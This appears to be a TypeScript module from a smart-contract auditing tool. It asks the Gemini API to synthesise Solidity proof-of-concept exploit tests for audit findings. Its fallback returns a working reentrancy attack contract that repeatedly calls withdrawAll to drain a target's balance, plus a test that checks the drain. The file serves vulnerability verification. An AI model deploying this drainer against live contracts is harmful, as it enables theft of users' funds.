import axios from 'axios';
import { GEMINI_API_KEY } from '../config/env';
import { FindingToProve } from '../types';
import { buildPoCSynthesisPrompt } from './poc-prompt';

export class PoCSynthesizer {
  /**
   * Synthesizes an executable Solidity Proof-of-Concept exploit test using Google Gemini.
   * If Gemini API is offline or returns an error, falls back to a clean deterministic exploit template.
   */
  static async synthesizePoC(
    contractFileName: string,
    sourceCode: string,
    finding: FindingToProve,
  ): Promise<string> {
    const prompt = buildPoCSynthesisPrompt(contractFileName, sourceCode, finding);

    if (GEMINI_API_KEY && GEMINI_API_KEY.length > 5) {
      try {
        const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent?key=${GEMINI_API_KEY}`;
        const response = await axios.post(
          url,
          {
            contents: [
              {
                role: 'user',
                parts: [{ text: prompt }],
              },
            ],
            generationConfig: {
              temperature: 0.1,
              maxOutputTokens: 2048,
            },
          },
          { timeout: 15000 },
        );

        const text = response.data?.candidates?.[0]?.content?.parts?.[0]?.text;
        if (text) {
          const match = text.match(/```solidity([\s\S]*?)```/) || text.match(/```([\s\S]*?)```/);
          if (match && match[1]) {
            return match[1].trim();
          }
          if (text.includes('contract ExploitTest')) {
            return text.trim();
          }
        }
      } catch (err: any) {
        console.warn(`[PoC Synthesizer] Gemini API call failed (${err.message}). Using deterministic exploit template.`);
      }
    }

    // Deterministic synthesized template fallback
    const targetName = contractFileName.replace(/\.sol$/, '') || 'Target';
    return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface I${targetName} {
    function deposit() external payable;
    function withdrawAll() external;
}

contract ReentrancyAttacker {
    I${targetName} public target;
    address public owner;

    constructor(address _target) {
        target = I${targetName}(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawAll();
        }
    }
}

contract ExploitTest {
    function test_exploit(address targetAddr) external payable {
        ReentrancyAttacker attacker = new ReentrancyAttacker(targetAddr);
        uint256 targetBalanceBefore = targetAddr.balance;
        
        attacker.attack{value: 1 ether}();
        
        uint256 targetBalanceAfter = targetAddr.balance;
        require(targetBalanceAfter < targetBalanceBefore, "EXPLOIT_FAILED: Balance not drained");
    }
}`;
  }
}
